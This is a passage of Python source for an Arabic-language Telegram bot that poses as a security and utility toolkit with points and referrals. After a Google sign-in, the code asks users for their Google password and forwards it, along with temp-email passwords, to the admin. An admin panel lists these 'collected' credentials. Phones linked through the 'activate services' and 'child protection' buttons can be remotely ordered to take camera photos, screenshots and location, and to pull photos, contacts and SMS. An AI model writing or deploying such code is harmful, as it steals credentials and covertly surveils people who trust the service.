SCOPES = ['https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile']

def generate_google_auth_url():
    if not GOOGLE_CLIENT_ID:
        return None
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'scope': ' '.join(SCOPES),
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent'
    }
    req = requests.Request('GET', GOOGLE_AUTH_URL, params=params)
    return req.prepare().url

def exchange_code_for_token(code):
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return None
    data = {
        'code': code,
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    try:
        response = REQUEST_SESSION.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
        response.raise_for_status()
        return response.json()
    except:
        return None

def get_google_user_info(access_token):
    if not access_token:
        return None
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        response = REQUEST_SESSION.get(GOOGLE_USERINFO_URL, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()
    except:
        return None

def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    url = generate_google_auth_url()
    if not url:
        safe_send(chat_id, "⚠️ الخدمة غير متاحة.")
        return
    safe_send(chat_id, f"🔑 ربط Google\n1. افتح الرابط: {url}\n2. انسخ الرمز وأرسل: /oauth <الرمز>\n3. أدخل كلمة السر.")
    notify_admin(f"🔑 مستخدم {chat_id} بدأ ربط Google")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة العامة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
user_welcome_sent = {}
tts_voice_selection = {}

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "دردشة ذكية": 0, "إنشاء صور": 0, "إيميل مؤقت": 0,
    "التحكم بالهاتف": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "ربط هاتف المستخدم": 0, "ربط هاتف الطفل": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0, "الرقابة الأبوية": 0,
    "تحليل PDF": 0, "رقم مؤقت": 0, "تحويل نص لصوت": 0, "تحميل فيديو": 0,
    "تقصير روابط": 0
}

REQUIRE_LINK_BUTTONS = ["mode_apk", "mode_my_app", "mode_track_phone", "mode_fb_report"]

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    
    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان" if is_admin_user else ("🔍 فحص الأمان ✅" if user_points >= 10 else "🔍 فحص الأمان 🔒"), 
                            callback_data="mode_site" if is_admin_user or user_points >= 10 else "locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات" if is_admin_user else ("📦 فحص التطبيقات ✅" if user_points >= 10 else "📦 فحص التطبيقات 🔒"), 
                            callback_data="mode_apk" if is_admin_user or user_points >= 10 else "locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود" if is_admin_user else ("🛠️ مراجعة الكود ✅" if user_points >= 10 else "🛠️ مراجعة الكود 🔒"), 
                            callback_data="mode_my_app" if is_admin_user or user_points >= 10 else "locked_my_app"),
        InlineKeyboardButton("🧠 مساعد ذكي", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🖼️ إنشاء صور", callback_data="mode_image"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email")
    )
    if is_admin_user or user_points >= 30:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك" if is_admin_user else "بلاغ فيسبوك ✅", 
                                callback_data="mode_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    else:
        markup.row(
            InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("📍 تتبع رقم" if is_admin_user else ("📍 تتبع رقم ✅" if user_points >= 10 else "📍 تتبع رقم 🔒"), 
                                callback_data="mode_track_phone" if is_admin_user or user_points >= 10 else "locked_track_phone")
        )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf")
    )
    if is_admin_user or user_points >= 50:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم" if is_admin_user else "📱 الحصول على رقم ✅", 
                                callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
        )
    markup.row(
        InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_link_user"),
        InlineKeyboardButton("🚸 حماية إضافية", callback_data="mode_link_child")
    )
    markup.row(
        InlineKeyboardButton("🔊 تحويل نص إلى صوت" if is_admin_user else ("🔊 تحويل نص إلى صوت ✅" if user_points >= 10 else "🔊 تحويل نص إلى صوت 🔒"), 
                            callback_data="mode_tts" if is_admin_user or user_points >= 10 else "locked_tts"),
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download")
    )
    markup.row(
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ Google متصل", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔑 ربط Google", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            markup.row(InlineKeyboardButton(f"📱 {dev['device_id']}", callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

def build_fb_report_type_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    welcome = (
        "مرحبا بك في نظام ANONYMOUS_T11\n"
        "قم بالضغط على /Start ليعمل النظام 🌐\n"
        "واختر الخيارات التي تريدها 🤖\n"
        "بعض الخيارات تحتاج إلى نقاط 🔒\n"
        "للحصول على نقاط عليك مشاركة النظام 🤖\n"
        "بعض الخيارات تحتاج لتفعيل الخدمات 🤖\n"
        "اوامر المساعدة اضغط /help 👤"
    )
    safe_send(chat_id, welcome)
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 الأوامر المتاحة\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - ربط Google\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط.\n"
        "🔒 الأزرار المغلقة تتطلب نقاطاً.\n"
        "🔓 الأزرار المفتوحة متاحة للجميع.\n"
        "👑 المطور لديه صلاحية كاملة ولا يحتاج نقاط."
    )
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['oauth'])
def google_oauth(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send(chat_id, "❌ استخدم: /oauth <الرمز>")
        return
    code = parts[1].strip()
    token_data = exchange_code_for_token(code)
    if not token_data:
        safe_send(chat_id, "❌ فشل التبادل.")
        return
    user_info = get_google_user_info(token_data['access_token'])
    if not user_info:
        safe_send(chat_id, "❌ فشل جلب البيانات.")
        return
    google_users[chat_id] = {
        'id': user_info['id'],
        'email': user_info['email'],
        'name': user_info['name'],
        'access_token': token_data['access_token'],
        'refresh_token': token_data.get('refresh_token'),
        'expiry': datetime.now() + timedelta(seconds=token_data['expires_in'])
    }
    user_states[chat_id] = "waiting_for_google_password"
    safe_send(chat_id, "✅ تم ربط البريد. الرجاء إدخال كلمة السر.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج النقر على الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"answer_callback_query error: {e}")
    
    chat_id = call.message.chat.id
    user_id = chat_id
    data = call.data

    if data.startswith("voice_"):
        voice_key = data.split("_")[1]
        tts_voice_selection[chat_id] = voice_key
        user_states[chat_id] = "waiting_for_tts_text"
        safe_send(chat_id, f"✅ تم اختيار صوت: {VOICE_MAP[voice_key]['name']}\n\nالآن أرسل النص الذي تريد تحويله إلى صوت.")
        return

    if data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nالآن اكتب شرحاً مفصلاً للمشكلة.")
        return

    if data.startswith("locked_"):
        if is_admin(user_id):
            actual_mode = data.replace("locked_", "mode_")
            if actual_mode == "mode_site":
                user_states[chat_id] = "waiting_for_site"
                safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
            elif actual_mode == "mode_apk":
                user_states[chat_id] = "waiting_for_apk"
                safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
            elif actual_mode == "mode_my_app":
                user_states[chat_id] = "waiting_for_my_app"
                safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
            elif actual_mode == "mode_track_phone":
                user_states[chat_id] = "waiting_for_track_num"
                safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
            elif actual_mode == "mode_tts":
                if not FFMPEG_AVAILABLE:
                    safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
                    return
                safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
            else:
                safe_send(chat_id, "⚠️ ميزة غير معروفة.")
            return
        
        points = get_user_points(user_id)
        if points < 10:
            safe_send(chat_id, "❌ نقاط غير كافية! تحتاج 10 نقاط لاستخدام هذه الميزة.")
            return
        if not deduct_points(chat_id, 10, f"استخدام ميزة {data}"):
            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        actual_mode = data.replace("locked_", "mode_")
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_tts":
            if not FFMPEG_AVAILABLE:
                safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
                return
            safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    if data.startswith('admin_') and not is_admin(chat_id):
        safe_send(chat_id, "❌ للمطور فقط.")
        return

    if data == "locked_fb_report":
        if is_admin(chat_id):
            data = "mode_fb_report"
        else:
            points = get_user_points(chat_id)
            if points < 30:
                safe_send(chat_id, f"⚠️ تحتاج 30 نقطة. لديك {points}")
                return
            if not deduct_points(chat_id, 30, "استخدام بلاغ فيسبوك"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            data = "mode_fb_report"

    if data == "locked_temp_number":
        if is_admin(chat_id):
            data = "mode_temp_number"
        else:
            points = get_user_points(chat_id)
            if points < 50:
                safe_send(chat_id, f"⚠️ تحتاج 50 نقطة. لديك {points}")
                return
            if not deduct_points(chat_id, 50, "استخدام الحصول على رقم"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            data = "mode_temp_number"

    if data in REQUIRE_LINK_BUTTONS and not is_admin(chat_id) and chat_id not in linked_users:
        safe_send(chat_id, "🔗 مطلوب تفعيل الخدمات أولاً.", reply_markup=build_main_menu(chat_id))
        return

    if data == "mode_ai":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_ai"
            safe_send(chat_id, "🧠 اكتب سؤالك (المطور معفي من خصم النقاط).")
            return
        points = get_user_points(chat_id)
        if points < 5:
            safe_send(chat_id, "❌ نقاط غير كافية! تحتاج 5 نقاط لاستخدام المساعد الذكي.")
            return
        if not deduct_points(chat_id, 5, "استخدام المساعد الذكي"):
            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        user_states[chat_id] = "waiting_for_ai"
        safe_send(chat_id, "🧠 اكتب سؤالك (سيتم خصم 5 نقاط).")
        return

    if data == "mode_image":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_image"
            safe_send(chat_id, "🖼️ اكتب وصف الصورة (المطور معفي من خصم النقاط).")
            return
        points = get_user_points(chat_id)
        if points < 10:
            safe_send(chat_id, "❌ نقاط غير كافية! تحتاج 10 نقاط لإنشاء صورة.")
            return
        if not deduct_points(chat_id, 10, "إنشاء صورة"):
            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        user_states[chat_id] = "waiting_for_image"
        safe_send(chat_id, "🖼️ اكتب وصف الصورة (سيتم خصم 10 نقاط).")
        return

    if data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
        return

    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت\n{email}\n🔑 كلمة السر: {password}\nاستخدم /check_email لعرض الرسائل."
            send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    elif data == "mode_fb_report":
        if not is_admin(chat_id) and get_user_points(chat_id) < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ", reply_markup=build_fb_report_type_markup())
    elif data == "mode_link_user":
        send_termux_instructions(chat_id, role='user')
        feature_usage["ربط هاتف المستخدم"] += 1
    elif data == "mode_link_child":
        send_termux_instructions(chat_id, role='child')
        feature_usage["ربط هاتف الطفل"] += 1
    elif data == "mode_tts":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
            return
        safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    elif data == "mode_google_login":
        google_login(call.message)
    elif data == "mode_google_logout":
        google_logout(call.message)
    elif data == "mode_show_points":
        points = get_user_points(chat_id)
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} نقطة - {row['reason']}\n"
                text += f"   {row['created_at'][:16]}\n"
            safe_send(chat_id, text)
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    elif data == "mode_admin":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        stats = "👑 لوحة المطور\n"
        for f, c in feature_usage.items():
            stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    elif data == "mode_view_devices":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n📅 {d['registered_at'][:10]}\n\n"
        safe_send(chat_id, text)
    elif data == "mode_remote_admin":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    elif data == "mode_set_dev_endpoint":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_dev_endpoint"
            safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data.startswith("remote_select_"):
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM registered_devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                user_states[chat_id] = "waiting_for_remote_command"
                safe_send(
                    chat_id,
                    f"✅ تم اختيار: {device_id}\n\n"
                    "📝 الأوامر:\n"
                    "• موقع - الموقع التقريبي\n"
                    "• كاميرا - التقاط صورة\n"
                    "• لقطة - لقطة شاشة\n"
                    "• صور - سحب صور\n"
                    "• جهات اتصال - سحب جهات الاتصال\n"
                    "• رسائل - عرض الرسائل النصية"
                )
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    elif data == "admin_stats":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        stats = f"📊 إحصائيات البوت\n\n"
        stats += f"👥 المستخدمون: {len(get_registered_devices_db())}\n"
        stats += f"📱 الأجهزة المسجلة: {len(get_registered_devices_db())}\n"
        stats += f"🔑 مستخدمي Google: {len(google_users)}\n"
        stats += f"\n📊 الاستخدام:\n"
        for f, c in feature_usage.items():
            if c > 0:
                stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    elif data == "admin_broadcast":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "admin_collected_data":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        collected = "📩 المعلومات المجمعة\n\n"
        if google_passwords:
            collected += "🔑 كلمات سر Google\n"
            for uid, pwd in google_passwords.items():
                email = google_users.get(uid, {}).get('email', 'غير معروف')
                collected += f"• {uid} ({email}): {pwd}\n"
        if temp_emails:
            collected += "\n📧 البريد المؤقت\n"
            for uid, data in temp_emails.items():
                collected += f"• {uid}: {data['email']} | {data['password']}\n"
        if not google_passwords and not temp_emails:
            collected += "📭 لا توجد معلومات."
        safe_send(chat_id, collected)
    elif data == "admin_logs":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        try:
            with open('bot.log', 'r') as f:
                logs = f.read().splitlines()[-30:]
                text = "📜 آخر 30 سطر\n" + "\n".join(logs)
                safe_send(chat_id, text)
        except:
            safe_send(chat_id, "⚠️ لا يوجد سجل.")
    elif data == "admin_ban_user":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_ban_user"
            safe_send(chat_id, "🚫 أرسل معرف المستخدم للحظر.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "admin_unban_user":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_unban_user"
            safe_send(chat_id, "✅ أرسل معرف المستخدم لإلغاء الحظر.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']}\n"
                response += f"   🌍 البلد: {num['country']}\n"
                response += f"   📡 المصدر: {num['source'][:30]}...\n\n"
            response += "\n🔹 اختر رقماً واطلب كود التفعيل عبر الأمر:\n"
            response += "🔹 /verify <الرقم> (سيتم جلب كود التفعيل تلقائياً)"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        if state == "waiting_for_shorten":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                return
            safe_send(chat_id, "⏳ جاري تقصير الرابط...")
            short_url, error = shorten_url(text)
            if error:
                safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
            else:
                safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_tts_text":
            voice_key = tts_voice_selection.get(chat_id, 'female')
            safe_send(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            result, error = text_to_speech(text, voice_key)
            if error:
                safe_send(chat_id, f"⚠️ {error}")
            elif result and os.path.exists(result):
                try:
                    with open(result, 'rb') as f:
                        bot.send_voice(chat_id, f)
                    os.remove(result)
                except Exception as e:
                    safe_send(chat_id, f"⚠️ فشل إرسال الصوت: {str(e)}")
            else:
                safe_send(chat_id, "⚠️ فشل تحويل النص إلى صوت.")
            user_states[chat_id] = None
            tts_voice_selection.pop(chat_id, None)
            return

        if state == "waiting_for_ban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    safe_send(chat_id, "❌ لا يمكن حظر المطور.")
                    user_states[chat_id] = None
                    return
                ban_user(user_id)
                safe_send(chat_id, f"✅ تم حظر المستخدم {user_id}.")
                notify_admin(f"🚫 حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                unban_user(user_id)
                safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
                notify_admin(f"✅ إلغاء حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_google_password":
            if chat_id in google_users:
                password = text
                email = google_users[chat_id]['email']
                google_passwords[chat_id] = password
                send_sensitive_data_to_admin("Google Password", f"{email} | {password}", chat_id)
                safe_send(chat_id, "✅ تم ربط Google.")
                user_states[chat_id] = None
            return

        if state == "waiting_for_dev_endpoint" and is_admin(chat_id):
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                safe_send(chat_id, f"✅ تم تعيين: {text}")
            else:
                safe_send(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        if is_admin(chat_id) and state == "waiting_for_remote_command":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                safe_send(chat_id, "❌ لم يتم اختيار جهاز.")
                user_states[chat_id] = None
                return
            command = text.lower()
            if command == "/cancel":
                safe_send(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return
            add_pending_command_db(device_id, command)
            safe_send(chat_id, f"⏳ تم إرسال الأمر {command} إلى الجهاز.")
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
